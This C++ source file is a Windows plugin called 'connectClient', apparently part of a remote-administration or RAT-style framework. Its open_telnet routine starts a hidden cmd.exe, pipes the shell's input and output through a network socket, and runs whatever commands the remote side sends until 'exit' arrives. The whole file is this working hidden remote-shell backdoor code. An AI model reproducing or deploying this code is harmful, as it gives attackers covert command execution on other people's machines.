#include "..\include\globalDefine.h"
#include "..\include\serverStruct.h"
#include "..\include\fliter.h"
class connectClient : public PluginNamespace::pluginBase
{
public:
      bool runFun(PluginNamespace::PluginInfo &info) override
      {
            auto pluginInfo = (PluginInfoStruct *)(info.cus->data[0]);
            return open_telnet(*info.mainConnectSocket) == SUCCESS_OPERAT;
      }
      connectClient()
      {
            this->used = true;
            this->pluginName = "connectClient";
            this->version = "1.0.0";
            this->author = "x3fang";
      }

private:
      int open_telnet(SOCKET &socket)
      {
            PROCESS_INFORMATION Processinfo;
            STARTUPINFO Startupinfo;
            HANDLE outputRead, outputWrite;
            HANDLE inputRead, inputWrite;
            SECURITY_ATTRIBUTES sa = {0};
            char szCMDPath[255];
            DWORD dwBytesRead = 0;
            DWORD dwBytesWrite = 0;

            sa.nLength = sizeof(sa);
            sa.bInheritHandle = TRUE;
            sa.lpSecurityDescriptor = NULL;
            // 创建标准输入/输出管道
            if (!CreatePipe(&outputRead, &outputWrite, &sa, 0) || !CreatePipe(&inputRead, &inputWrite, &sa, 0))
                  return GetLastError();
            // 分配内存资源，初始化数据
            ZeroMemory(&Processinfo, sizeof(PROCESS_INFORMATION));
            ZeroMemory(&Startupinfo, sizeof(STARTUPINFO));
            GetEnvironmentVariable("COMSPEC", szCMDPath, sizeof(szCMDPath));

            // 设置启动信息
            Startupinfo.cb = sizeof(STARTUPINFO);
            Startupinfo.wShowWindow = SW_HIDE;
            Startupinfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
            Startupinfo.hStdInput = (HANDLE)inputRead;
            Startupinfo.hStdOutput = (HANDLE)outputWrite;
            Startupinfo.hStdError = (HANDLE)outputWrite;

            if (CreateProcess(NULL, szCMDPath, NULL, NULL, TRUE, 0, NULL, NULL, &Startupinfo, &Processinfo))
            {
                  CloseHandle(outputWrite);
                  CloseHandle(inputRead);
                  std::string buf;
                  buf = readPipeALLData(outputRead).first;
                  send(socket, buf);
                  while (1)
                  {
                        recv(socket, buf);

                        WriteFile(inputWrite, buf.c_str(), strlen(buf.c_str()), &dwBytesWrite, NULL);
                        if (buf == "\r\nexit\r\n")
                              break;
                        buf = readPipeALLData(outputRead).first;

                        send(socket, buf);
                  }
            }
            else
            {
                  return GetLastError();
            }

            // 关闭进程句柄
            CloseHandle(Processinfo.hProcess);
            CloseHandle(Processinfo.hThread);
            return SUCCESS_OPERAT;
      }
      std::pair<std::string, DWORD> readPipeALLData(HANDLE outputRead)
      {
            std::string res;
            char cbuf[512] = {0};
            DWORD dwBytesRead = 0;
            DWORD mode = PIPE_NOWAIT;
            SetNamedPipeHandleState(outputRead, &mode, NULL, NULL);
            int flag = 0; // 判断是否是第5次遇到 ERROR_NO_DATA (重试次数)
            do
            {
                  ReadFile(outputRead, cbuf, sizeof(cbuf), &dwBytesRead, NULL);
                  DWORD error = GetLastError();
                  SetLastError(ERROR_SUCCESS);
                  if (error == ERROR_NO_DATA)
                  {
                        if (flag == 5)
                              break;
                        flag += 1;
                        Sleep(10);
                        continue;
                  }
                  res += cbuf;
                  memset(cbuf, 0, sizeof(cbuf));
                  if (dwBytesRead == 0)
                        break;
            } while (true);
            return make_pair(res, dwBytesRead);
      }
};
static connectClient Plugin_connectClient;
extern "C"
{
      EXPORT bool registerFun(PluginNamespace::PluginManager &pluginManager)
      {
            return pluginManager.registerFun(&Plugin_connectClient).first;
      }
}